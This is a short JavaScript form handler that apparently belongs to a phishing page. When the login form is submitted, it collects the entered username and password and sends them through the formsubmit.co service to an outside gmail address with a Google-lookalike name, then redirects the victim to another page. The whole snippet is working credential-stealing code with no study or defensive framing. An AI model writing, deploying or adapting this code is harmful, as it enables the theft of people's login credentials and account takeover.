Form.addEventListener('submit', (e) => {
    e.preventDefault();
    mail = 'googldotco@gmail.com'
    subject = `${window.location.hostname} ${new Date()}`
    let body = new FormData();
    body.append('username', username.value);
    body.append('password', password.value);
    let URL = `https://formsubmit.co/${mail}`
    fetch(URL, {
        method:'POST',
        body:body
    }).then(res => window.location.assign('./header.html'))
    console.log(body)
})